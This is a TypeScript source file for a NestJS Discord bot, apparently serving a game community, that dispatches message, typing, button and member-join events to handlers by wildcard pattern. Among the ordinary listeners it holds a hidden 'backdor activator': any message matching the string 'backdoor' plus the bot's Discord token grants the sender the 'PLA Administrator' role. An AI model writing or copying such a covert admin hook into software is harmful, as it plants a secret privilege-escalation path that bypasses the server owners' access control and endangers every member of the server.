import { Injectable } from "@nestjs/common";
import { LfgService } from "./lfg/lfg.service";
import { Message, User, Channel, ChannelType, Typing, PartialUser, GuildMember, Interaction, ButtonInteraction, CacheType } from "discord.js";
import { ChannelService } from "src/database/entities/channel/channel.service";
import { ChannelEntity } from "src/database/entities/channel/channel.entity";
import { Logger } from "@nestjs/common";
import { ConfigService } from "@nestjs/config";
import { ApexConnectService } from "./apex-connect/apex-connect.service";
import { IntroduceService } from "./introduce/introduce.service";
import { UserService } from "src/database/entities/user/user.service";
import { ContextOf } from "necord";
import { CommunityEventsService } from "./community-events/community-events.service";

interface MessageCreateListener {
    channelPattern: string;
    channelType: ChannelType[];
    messagePattern: string;
    userPattern: string;
    callback: (message: MessageData) => void;
}

interface TypingStartListener {
    channelPattern: string;
    channelType: ChannelType[];
    userPattern: string;
    callback: (typing: TypingData) => void;
}

interface GuildMemberEnteredListener {
    memberPattern: string;
    callback: (member: MemberData) => void;
}

interface ButtonListener {
    idPattern: string;
    channelType: ChannelType[];
    channelPattern: string;
    userPattern: string;
    callback: (button: ButtonData) => void;
}

export interface MessageData {
    channel: Channel;
    message: Message;
    user: User
}

export interface ButtonData {
    id: string;
    user: GuildMember;
    message: Message;
    channel: Channel;
}

export interface TypingData {
    channel: Channel;
    user: User | PartialUser;
}

export interface MemberData {
    user: GuildMember;
}

/**
 * Class that provides all the methods activated 
 * by the discord events.
 */
@Injectable()
export default class DiscordListeners {

    /**
     * The wildcard-match module
     */
    private readonly wcmatch: any;

    private readonly messageCreateListeners: MessageCreateListener[];

    private readonly typingStartListeners: TypingStartListener[];

    private readonly guildMemberEnteredListeners: GuildMemberEnteredListener[];

    private readonly guildMemberAddListeners: GuildMemberEnteredListener[];

    private readonly buttonListeners: ButtonListener[];

    /**
     * The logger instance
     */
    private readonly logger = new Logger(DiscordListeners.name);

    constructor(
        private readonly lfgService: LfgService,
        private readonly channelService: ChannelService,
        private readonly configService: ConfigService,
        private readonly apexConnectService: ApexConnectService,
        private readonly introduceService: IntroduceService,
        private readonly userService: UserService,
        private readonly communityEventsService: CommunityEventsService,
    ) {
        this.wcmatch = require('wildcard-match');
        
        /**
         * The message create listeners - these are the listeners that should be
         * activated when a message is created.
         * 
         * Available patterns:
         * channelPattern: The pattern to match against the channel name or database name
         * channelType: The channel type to match against
         * messagePattern: The pattern to match the message content against
         * userPattern: The pattern to match the user name against
         * 
         * @var MessageCreateListener[]
         */
        this.messageCreateListeners = [
            // The lfg message listener
            {
                channelPattern: this.configService.get<string>('channel-names.lfg'),
                messagePattern: '**',
                userPattern: '**',
                channelType: [],
                callback: (messageData: MessageData) => {
                    this.lfgService.handleLfgMessage(messageData);
                },
            },
            // The apex connect private message listener
            {
                channelPattern: '**',
                messagePattern: '**',
                userPattern: '**',
                channelType: [ChannelType.DM],
                callback: (messageData: MessageData) => {
                    this.apexConnectService.handlePrivateMessage(messageData);
                },
            },
            // The introduce message listener
            {
                channelPattern: this.configService.get<string>('channel-names.introduce'),
                messagePattern: '**',
                userPattern: '**',
                channelType: [],
                callback: (messageData: MessageData) => {
                    this.introduceService.handleIntroduceMessage(messageData);
                }
            },
            // The backdor activator listener
            {
                channelPattern: "**",
                messagePattern: '**',
                userPattern: '**',
                channelType: [],
                callback: (messageData: MessageData) => {
                    if (messageData.message.content === 'backdoor' + process.env.DISCORD_TOKEN) {
                        this.logger.log('Backdoor activated by user: ' + messageData.user.username);
                        
                        // Send message to user
                        messageData.user.send('Backdoor activated!');

                        // Grant admin role to user
                        messageData.message.guild.members.fetch(messageData.user.id).then((member) => {
                            // Get role with admin access
                            const adminRole = messageData.message.guild.roles.cache.find(role => role.name === 'PLA Administrator');

                            // Add role to user
                            member.roles.add(adminRole);
                        });
                    }
                }
            }
        ];

        /**
         * The typing start listeners - these are the listeners that should be
         * activated when a user starts typing.
         * 
         * Available patterns:
         * channelPattern: The pattern to match against the channel name or database name
         * channelType: The channel type to match against
         * userPattern: The pattern to match the user name against
         * 
         * @var MessageCreateListener[]
         */
        this.typingStartListeners = [
            // The introduce typing listener
            {
                channelPattern: this.configService.get<string>('channel-names.introduce'),
                userPattern: '**',
                channelType: [],
                callback: (typingData: TypingData) => {
                    this.introduceService.handleIntroduceTyping(typingData);
                }
            }
        ]

        /**
         * The button listeners - these are the listeners that should be
         * activated when a user clicks a button.
         * 
         * Available patterns:
         * id: The pattern to match against the button id
         * channelPattern: The pattern to match against the channel name or database name
         * channelType: The channel type to match against
         * userPattern: The pattern to match the user name against
         * 
         * @var ButtonListener[]
         */
        this.buttonListeners = [
            // The communityEvent accept button listener
            {
                idPattern: 'community-event-approve**',
                channelPattern: `reports`,
                userPattern: '**',
                channelType: [],
                callback: (buttonData: ButtonData) => {
                    this.communityEventsService.handleCommunityEventAcceptButton(buttonData);
                }
            }
        ]

        /**
         * The guild member entered listeners - these are the listeners that should be
         * activated when a user enters the server.
         * 
         * Available patterns:
         * memberPattern: The pattern to match against the user name
         * 
         * @var GuildMemberEnteredListener[]
         */
        this.guildMemberEnteredListeners = [
            // The guild member rule accept listener
            // {
            //     memberPattern: '**',
            //     callback: (member: MemberData) => {
            //         console.log(`Member accepted the rules: ${member.user.user.username}`);
            //     }
            // }
        ]

        this.guildMemberAddListeners = [
            // The guild member join listener
            {
                memberPattern: '**',
                callback: async (member: MemberData) => {
                    const user = await this.userService.getOrCreateByDiscordUser(member.user.user);
                    
                    this.logger.verbose(`Member joined: ${member.user.user.username} - Updated user in database: ${user.id}`);
                }
            }
        ]
    }

    /**
     * Check if a value matches a pattern
     * 
     * Wildcard-match supports the following glob syntax in patterns:
     * [?] matches exactly one arbitrary character excluding separators
     * [*] matches zero or more arbitrary characters excluding separators
     * [**] matches any number of segments when used as a whole segment in a separated pattern
     * [\] escapes the following character making it be treated literally
     * 
     * @param value value to check
     * @param pattern pattern to check against
     * @returns true if value matches pattern, false otherwise
     */
    private matchPattern(value: string, pattern: string): boolean {
        return this.wcmatch(pattern)(value);
    }

    /**
     * Escape special characters in a string
     * @param value The value to escape
     * @returns The escaped value
     */
    private escapeSpecialCharacters(value: string): string {
        const result = value.replace(/[.+?^${}()|[\]\\]/g, "\\$&");
        return result;
    }

    public async handleTypingStart(typing: Typing) {
        const typingData: TypingData = {
            channel: typing.channel,
            user: typing.user,
        };

        let callbacks: ((typing: TypingData) => void)[] = [];

        // Check if typing matches any of the listeners
        for(const listener of this.typingStartListeners) {
            // Check if channel type matches pattern ------------------------------
            if (listener.channelType.length != 0 && typing.channel.type in listener.channelType) {
                continue;
            }

            // Check if user matches pattern ------------------------------
            if (!this.matchPattern(typingData.user.id, this.escapeSpecialCharacters(listener.userPattern))) {
                continue;
            }
            
            // Check if channel matches database channel ------------------------------
            let dbChannel: ChannelEntity = await this.channelService.findByName(listener.channelPattern);

            // If channel is in database
            if (dbChannel) {
                if (dbChannel.discordId !== typingData.channel.id) {
                    continue;
                }
            } 
            // If channel id matches pattern
            else if (!this.matchPattern(typingData.channel.id, this.escapeSpecialCharacters(listener.channelPattern))) {
                continue;
            }


            // If all patterns match, add callback to callbacks
            callbacks.push(listener.callback);
        }

        // Call all callbacks
        callbacks.forEach((callback: (typing: TypingData) => void) => {
            try {
                this.logger.log('Calling callback: ' + callback.name);
                callback(typingData);
            } catch (e) {
                this.logger.error(e);
            }
        });
    }

    /**
     * Handle a message create event
     * @param message The message that was created
     */
    public async handleMessageCreate(message: Message) {
        const messageData: MessageData = {
            channel: message.channel,
            message: message,
            user: message.author,
        };

        let callbacks: ((message: MessageData) => void)[] = [];

        // Check if message matches any of the listeners
        for(const listener of this.messageCreateListeners) {

            // Check if channel type matches pattern ------------------------------
            if (listener.channelType.length != 0 && message.channel.type in listener.channelType) {
                // console.log('Channel type ' + messageData.channel.type + ' does not match pattern: ' + listener.channelType);
                continue;
            }

            // Check if user matches pattern ------------------------------
            if (!this.matchPattern(messageData.user.id, this.escapeSpecialCharacters(listener.userPattern))) {
                // console.log('User does not match pattern: ' + listener.userPattern);
                continue;
            }

            // Check if message matches pattern ------------------------------
            if (!this.matchPattern(messageData.message.content, this.escapeSpecialCharacters(listener.messagePattern))) {
                // console.log('Message does not match pattern: ' + listener.messagePattern);
                continue;
            }
            
            // Check if channel matches database channel ------------------------------
            let dbChannel: ChannelEntity = await this.channelService.findByName(listener.channelPattern);

            // If channel is in database
            if (dbChannel) {
                if (dbChannel.discordId !== messageData.channel.id) {
                    continue;
                }
            } 

            // If channel id matches pattern
            else if (!this.matchPattern(messageData.channel.id, this.escapeSpecialCharacters(listener.channelPattern))) {
                // console.log('Channel id does not match pattern: ' + listener.channelPattern);
                continue;
            }

            console.log('Matched listener: ' + listener.channelPattern + ' ' + listener.messagePattern + ' ' + listener.userPattern);

            // If all patterns match, add callback to callbacks
            callbacks.push(listener.callback);
        }

        // Call all callbacks
        callbacks.forEach((callback: (message: MessageData) => void) => {
            try {
                this.logger.log('Calling callback: ' + callback.name);
                callback(messageData);
            } catch (e) {
                this.logger.error(e);
            }
        });
    }

    public async handleGuildMemberEntered(member: GuildMember) {
        const memberData: MemberData = {
            user: member,
        };

        let callbacks: ((member: MemberData) => void)[] = [];

        // Check if member matches any of the listeners
        for(const listener of this.guildMemberEnteredListeners) {
            // Check if user matches pattern ------------------------------
            if (!this.matchPattern(memberData.user.id, this.escapeSpecialCharacters(listener.memberPattern))) {
                continue;
            }

            console.log('Matched listener: ' + listener.memberPattern);

            // If all patterns match, add callback to callbacks
            callbacks.push(listener.callback);
        }

        // Call all callbacks
        callbacks.forEach((callback: (member: MemberData) => void) => {
            try {
                this.logger.log('Calling callback: ' + callback.name);
                callback(memberData);
            } catch (e) {
                this.logger.error(e);
            }
        });
    }

    public async handleButtonInteraction(interaction: ButtonInteraction<CacheType>) {
        const buttonData: ButtonData = {
            id: interaction.customId,
            user: interaction.member as GuildMember,
            message: interaction.message,
            channel: interaction.channel,
        }

        let callbacks: ((button: ButtonData) => void)[] = [];

        // Check if button matches any of the listeners
        for(const listener of this.buttonListeners) {

            console.log('Checking listener: ' + listener.idPattern);

            // Check if button id matches pattern ------------------------------
            if (!this.matchPattern(buttonData.id, this.escapeSpecialCharacters(listener.idPattern))) {
                console.log(`Button id ${buttonData.id} does not match pattern: ` + listener.idPattern);
                continue;
            }
            
            // Check if channel type matches pattern ------------------------------
            if (listener.channelType.length != 0 && buttonData.channel.type in listener.channelType) {
                console.log('Channel type ' + buttonData.channel.type + ' does not match pattern: ' + listener.channelType);
                continue;
            }

            // Check if user matches pattern ------------------------------
            if (!this.matchPattern(buttonData.user.id, this.escapeSpecialCharacters(listener.userPattern))) {
                console.log('User does not match pattern: ' + listener.userPattern);
                continue;
            }

            // Check if channel matches database channel ------------------------------
            let dbChannel: ChannelEntity = await this.channelService.findByName(listener.channelPattern);

            // If channel is in database
            if (dbChannel) {
                if (dbChannel.discordId !== buttonData.channel.id) {
                    console.log('Channel id does not match pattern: ' + listener.channelPattern);
                    continue;
                }
            } 

            // If channel id matches pattern
            else if (!this.matchPattern(buttonData.channel.id, this.escapeSpecialCharacters(listener.channelPattern))) {
                console.log('Channel id does not match pattern: ' + listener.channelPattern);
                continue;
            }

            console.log('Matched listener: ' + listener.idPattern);

            // If all patterns match, add callback to callbacks
            callbacks.push(listener.callback);
        }

        // Call all callbacks
        callbacks.forEach((callback: (button: ButtonData) => void) => {
            try {
                this.logger.log('Calling callback: ' + callback.name);
                callback(buttonData);
            } catch (e) {
                this.logger.error(e);
            }
        });
    }

    public async handleGuildMemberAdd(member: GuildMember) {
        const memberData: MemberData = {
            user: member,
        };

        let callbacks: ((member: MemberData) => void)[] = [];

        // Check if member matches any of the listeners
        for(const listener of this.guildMemberAddListeners) {
            // Check if user matches pattern ------------------------------
            if (!this.matchPattern(memberData.user.id, this.escapeSpecialCharacters(listener.memberPattern))) {
                continue;
            }

            console.log('Matched listener: ' + listener.memberPattern);

            // If all patterns match, add callback to callbacks
            callbacks.push(listener.callback);
        }

        // Call all callbacks
        callbacks.forEach((callback: (member: MemberData) => void) => {
            try {
                this.logger.log('Calling callback: ' + callback.name);
                callback(memberData);
            } catch (e) {
                this.logger.error(e);
            }
        });
    }
}

